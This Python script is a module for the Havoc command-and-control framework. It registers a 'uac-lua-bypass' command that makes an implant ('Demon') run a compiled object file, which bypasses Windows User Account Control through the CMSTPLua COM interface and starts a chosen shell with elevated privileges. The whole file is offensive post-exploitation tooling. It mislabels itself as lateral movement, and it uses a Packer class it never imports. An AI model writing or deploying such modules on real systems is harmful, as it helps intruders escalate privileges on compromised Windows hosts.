from havoc import Demon, RegisterCommand, RegisterModule
from os.path import exists

def uac_bypass(demon_id, *args):
    task_id: str = None
    demon: Demon = None
    packer: Packer = Packer()
    binary: bytes = None
    # Get agent id
    demon = Demon(demon_id)
    shell_path = args[0]

    packer.addstr(shell_path)
    task_id = demon.ConsoleWrite(demon.CONSOLE_TASK, f"Tasked demon to execute {shell_path} using COM ")
    # Task the agent to execute the BoF with the entry point being "go"
    # and the arguments being the packed arguments buffer
    demon.InlineExecute(task_id, "go", f"UACBypass.{demon.ProcessArch}.o", packer.getbuffer(), False)
    return task_id

RegisterModule( "uac-lua-bypass", "lateral movement module", "", "[exploit] (args)", "", ""  )
RegisterCommand( uac_bypass, "uac-lua-bypass", "uac-bypass", "Bypass UAC using CMSTPLua", 0, "[shell path]", "cmd.exe whoami/priv" )
